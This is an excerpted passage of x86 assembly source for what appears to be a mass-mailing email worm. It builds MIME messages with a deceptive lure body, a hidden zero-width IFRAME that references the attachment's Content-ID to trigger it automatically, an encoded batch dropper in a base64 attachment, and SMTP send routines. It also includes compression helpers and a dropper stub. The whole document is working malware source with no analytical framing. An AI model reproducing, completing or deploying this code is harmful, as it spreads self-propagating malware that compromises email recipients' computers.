...
part13          db      offset part21 - offset $ - 2, " BOUNDARY=", 0
part21          db      offset body1 - offset $ - 2, " TEXT/PLAIN", 0
...
body1           db      offset body2 - offset $ - 1
                db      0dh, 0dh, "I received this file from you yesterday "
...
bodyg           db      0
part31          db      offset part32 - offset $ - 2, " TEXT/HTML", 0
part32          db      offset part33 - offset $ - 2, 0dh, "CONTENT-TRANSFER-ENCODING:", 0
part33          db      offset part34 - offset $ - 2, " QUOTED-PRINTABLE", 0
part34          db      offset content - offset $ - 2, 0dh, 0dh, "<IFRAME SRC=CID:", ourcid, " WIDTH=0>", 0
...
part41          db      offset suffix1 - offset $ - 2, " NAME=EMAIL", 0
...
part42          db      offset part43 - offset $ - 2, " BASE64", 0
part43          db      offset part44 - offset $ - 2, 0dh, "CONTENT-ID:", 0
part44          db      offset batdrop1 - offset $ - 2, ' <', ourcid, '>', 0
...
batdrop3        db      offset part45 - offset $ - 2
                db      ")tZ)tc)tl)tnVX,B,BP_ %%GW44PW%R%jD[FFKt(fDl4Yf():l0s54$)Q444l?v8,ElIv2,6f?C+8IGh)ho(fBQFNu1jRQX5TmZ4#P[5F@IZ4#*I=", 0dh, 0

part45          db      offset part46 - offset $ - 2, ".", 0dh, 0
part46          db      offset part47 - offset $ - 2, "QUIT", 0dh, 0
part47          db      0
...
netapi_esp      label   near
        ...
        mov     dword ptr ds:[offset store_netapi - offset junkmail_inf + expsize + 401001h], eax
...
skip_subject    label   near
        ...
        pop     ebp
        call    decompcomnt                     ;part12 ("multipart/mixed;")
        call    store_crlf
        xor     ebp, ebp
        ...
        push    offset part12 - offset part11 - 2
        pop     ebp
        call    decompcomnt                     ;part21 ("text/plain")
        ...
        push    offset part12 - offset part11 - 2
        pop     ebp
        call    decompcomnt                     ;part31 ("text/html")
        call    decompcmap                      ;part32 ("Content-Transfer-Encoding: ")
        push    offset part33 - offset part32 - 4
        pop     ebp
        call    decompcomnt                     ;part33 ("quoted-printable")
        call    decompoct                       ;part34 ("<IFRAME...")
        mov     eax, ('--' shl 10h) + 0a0dh
        stos    dword ptr [edi]
        pop     eax
        pop     ecx
        ...
        push    offset part12 - offset part11 - 2
        pop     ebp
        call    decompcomnt                     ;autorun
        call    store_crlf
        push    edi
        call    decompmain                      ;part41 (" name=email")
        push    edi
        call    decompmain                      ;suffix1
        call    random
        and     al, 1
        pop     eax
        jne     skip_suffix
...
patch_encode    label   near
        ...
        push    offset part33 - offset part32 - 4
        pop     ebp
        call    decompcomnt                     ;part42 ("base64")
        pop     eax
        pop     ecx
...
decode_cid      label   near
        call    decompcmap                      ;part43 ("Content-ID")
        call    decompcomnt                     ;part44 (ourcid)
        call    store_crlf
        call    store_crlf
        push    edi
...
decode_tail     label   near
        ...
        call    bound_copy
        call    randlines
        call    decompmain                      ;part45
        call    senddata
        call    decompmain                      ;part46
        call    senddata
...
decompcomnt     proc    near
        ...
        call    decompmain
        pop     eax
        push    71                              ;highest multiple of 4, < 76, -1
        pop     ebp
        sub     ebp, eax
        pop     eax
...
.code
dropper         label   near
        push    (offset part44 - offset smtp1 + 1)
        push    GMEM_FIXED
        call    GlobalAlloc
        push    eax
...
ife compress_only
        ...
        call    compmain                        ;part43
        call    compmain                        ;part44
        call    compmain                        ;batdrop1
        call    compmain                        ;part45
        call    compmain                        ;part46

if compress_only

        pop     esi
        push    (offset part44 - offset smtp1 + 1) * 7
        push    GMEM_FIXED
        call    GlobalAlloc
        push    eax
        push    esi
